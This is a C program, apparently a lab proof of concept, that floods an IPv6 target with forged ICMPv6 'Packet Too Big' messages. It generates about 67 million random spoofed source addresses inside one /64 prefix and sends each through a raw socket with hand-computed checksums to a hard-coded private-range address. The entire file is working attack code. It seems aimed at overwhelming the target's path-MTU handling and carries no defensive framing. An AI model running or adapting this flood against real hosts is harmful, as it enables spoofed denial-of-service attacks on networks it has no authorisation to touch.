#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>

#define TARGET_ADDR "fd12:35::3f05:2108:5d2b:570"
static const uint8_t SRC_NET[] = {
	// fd12:34::/64
	0xfd, 0x12, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00
};

static_assert(sizeof(SRC_NET) <= 16);

struct addr {
	uint8_t a_addr[16];
};
typedef struct addr addr_t;

int addr_comp_f (const void *a, const void *b) {
	return memcmp(a, b, sizeof(addr_t));
}

#define ADDR_POOL_SIZE (1*1024*1024*1024 / 16)
static addr_t addr_pool[ADDR_POOL_SIZE];

void init_addr_pool (void) {
	int fd;
	ssize_t iofr;

	errno = 0;
	fd = open("/dev/urandom", O_RDONLY);
	perror("open(\"/dev/urandom\", O_RDONLY)");
	assert(fd >= 0);

	iofr = read(fd, addr_pool, sizeof(addr_pool));
	assert(iofr == sizeof(addr_pool));
	close(fd);

	for (size_t i = 0; i < ADDR_POOL_SIZE; i += 1) {
		memcpy(addr_pool + i, SRC_NET, sizeof(SRC_NET));
	}
}

bool check_entropy_main (void) {
	size_t same_cnt = 0;
	size_t ret;

	// entropy check
	qsort(addr_pool, ADDR_POOL_SIZE, sizeof(addr_t), addr_comp_f);

	for (size_t i = 1; i < ADDR_POOL_SIZE; i += 1) {
		if (memcmp(addr_pool + i - 1, addr_pool + i, sizeof(addr_t)) == 0) {
			same_cnt += 1;
		}
	}

	ret = (size_t)ADDR_POOL_SIZE - same_cnt;
	fprintf(stderr,
		"uniq: %zu/%zu (%.3f)\n"
		,
		ret,
		(size_t)ADDR_POOL_SIZE,
		(double)ret/(double)ADDR_POOL_SIZE);

	return ret > 1;
}

void check_entropy (void) {
	pid_t child;

	child = fork();
	assert(child >= 0);
	if (child == 0) {
		const bool fr = check_entropy_main();
		exit(fr ? 0 : 1);
	}
	else {
		int status = 0;
		const pid_t fr = waitpid(child, &status, 0);

		assert(fr == child);
		assert(WEXITSTATUS(status) == 0);
	}
}

void report_sent (const void *addr, const int err) {
	char str_addr[INET6_ADDRSTRLEN] = { 0, };

	inet_ntop(AF_INET6, addr, str_addr, sizeof(str_addr));

	fprintf(stderr, "sendto %s: ", str_addr);
	errno = err;
	perror(NULL);
}

uint16_t calc_chksum6 (
	const struct ip6_hdr *ih,
	const uint8_t *nh,
	size_t n_len,
	const uint8_t *data,
	size_t data_len)
{
	uint_fast32_t sum = 0;
	const uint_fast32_t tcp_length = (uint32_t)(n_len + data_len);
	const uint8_t *addr_src = (const uint8_t*)&ih->ip6_src;
	const uint8_t *addr_dst = (const uint8_t*)&ih->ip6_dst;

	sum += ((uint_fast16_t)addr_src[0] << 8) | addr_src[1];
	sum += ((uint_fast16_t)addr_src[2] << 8) | addr_src[3];
	sum += ((uint_fast16_t)addr_src[4] << 8) | addr_src[5];
	sum += ((uint_fast16_t)addr_src[6] << 8) | addr_src[7];
	sum += ((uint_fast16_t)addr_src[8] << 8) | addr_src[9];
	sum += ((uint_fast16_t)addr_src[10] << 8) | addr_src[11];
	sum += ((uint_fast16_t)addr_src[12] << 8) | addr_src[13];
	sum += ((uint_fast16_t)addr_src[14] << 8) | addr_src[15];

	sum += ((uint_fast16_t)addr_dst[0] << 8) | addr_dst[1];
	sum += ((uint_fast16_t)addr_dst[2] << 8) | addr_dst[3];
	sum += ((uint_fast16_t)addr_dst[4] << 8) | addr_dst[5];
	sum += ((uint_fast16_t)addr_dst[6] << 8) | addr_dst[7];
	sum += ((uint_fast16_t)addr_dst[8] << 8) | addr_dst[9];
	sum += ((uint_fast16_t)addr_dst[10] << 8) | addr_dst[11];
	sum += ((uint_fast16_t)addr_dst[12] << 8) | addr_dst[13];
	sum += ((uint_fast16_t)addr_dst[14] << 8) | addr_dst[15];

	sum += (uint16_t)((tcp_length & 0xFFFF0000) >> 16);
	sum += (uint16_t)(tcp_length & 0xFFFF);
	sum += ih->ip6_ctlun.ip6_un1.ip6_un1_nxt;

	// tcp header
	while (n_len > 1) {
		sum += ((uint_fast32_t)nh[0] << 8) + nh[1];
		nh += 2;
		n_len -= 2;
	}
	if (n_len > 0) {
		sum += nh[0];
	}

	// data
	while (data_len > 1) {
		sum += ((uint_fast32_t)data[0] << 8) + data[1];
		data += 2;
		data_len -= 2;
	}
	if (data_len > 0) {
		sum += data[0];
	}

	return ~((sum & 0xFFFF) + (sum >> 16));
}

void icmp6_ptb_tail (
		const int fd,
		const void *snd_buf,
		const size_t snd_buf_len,
		struct sockaddr_in6 *sa,
		struct ip6_hdr *ih6,
		struct icmp6_hdr *icmp6)
{
}

void mount_attack_icmp6_ptb(void) {
	int fd;
	static struct {
		struct ip6_hdr ih6;
		struct icmp6_hdr icmp6;
		struct {
			struct ip6_hdr ih6;
			struct icmp6_hdr icmp6;
		} body;
	} snd_buf;
	static struct sockaddr_in6 sa;
	ssize_t fr;

	fr = inet_pton(AF_INET6, TARGET_ADDR, &snd_buf.ih6.ip6_dst);
	assert(fr > 0);
	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(snd_buf) - sizeof(struct ip6_hdr));
	snd_buf.icmp6.icmp6_type = ICMP6_PACKET_TOO_BIG;
	snd_buf.icmp6.icmp6_dataun.icmp6_un_data32[0] = htonl(1280);

	snd_buf.body.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(struct icmp6_hdr));
	memcpy(&snd_buf.body.ih6.ip6_src, &snd_buf.ih6.ip6_dst, 16);
	snd_buf.body.icmp6.icmp6_type = ICMP6_ECHO_REPLY;
	snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8[0] = 0xde;
	snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8[1] = 0xad;
	snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8[2] = 0xbe;
	snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8[3] = 0xef;

	sa.sin6_family = AF_INET6;
	memcpy(&sa.sin6_addr, &snd_buf.ih6.ip6_dst, 16);

	errno = 0;
	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	perror("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");
	assert(fd >= 0);

	for (size_t i = 0; i < ADDR_POOL_SIZE; i += 1) {
		memcpy(&snd_buf.ih6.ip6_src, addr_pool[i].a_addr, 16);
		memcpy(&snd_buf.body.ih6.ip6_dst, addr_pool[i].a_addr, 16);

		snd_buf.body.icmp6.icmp6_cksum = 0;
		snd_buf.body.icmp6.icmp6_cksum = htons(calc_chksum6(
			&snd_buf.body.ih6,
			(const uint8_t*)&snd_buf.body.icmp6,
			sizeof(struct icmp6_hdr),
			NULL,
			0
		));

		snd_buf.icmp6.icmp6_cksum = 0;
		snd_buf.icmp6.icmp6_cksum = htons(calc_chksum6(
			&snd_buf.ih6,
			(const uint8_t*)&snd_buf.icmp6,
			sizeof(snd_buf) - sizeof(struct ip6_hdr),
			NULL,
			0
		));

		fr = sendto(
			fd,
			&snd_buf,
			sizeof(snd_buf),
			MSG_NOSIGNAL,
			(const struct sockaddr*)&sa,
			sizeof(struct sockaddr_in6));

		if (fr < 0) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
	}

	// icmp6_ptb_tail(
	// 	fd,
	// 	&snd_buf,
	// 	sizeof(snd_buf),
	// 	&sa,
	// 	&snd_buf.ih6,
	// 	&snd_buf.icmp6);

	close(fd);
}

int main (const int argc, const char **argv) {
	if (true) {
		fprintf(stderr,
			"initialising address pool: %zu addresses ...\n"
			,
			(size_t)ADDR_POOL_SIZE);
		init_addr_pool();

		fprintf(stderr, "checking entropy ...\n");
		check_entropy();
	}

	if (true) {
		fprintf(stderr, "mount_attack_icmp6_ptb()  ...\n");
		mount_attack_icmp6_ptb();
	}

	return 0;
}
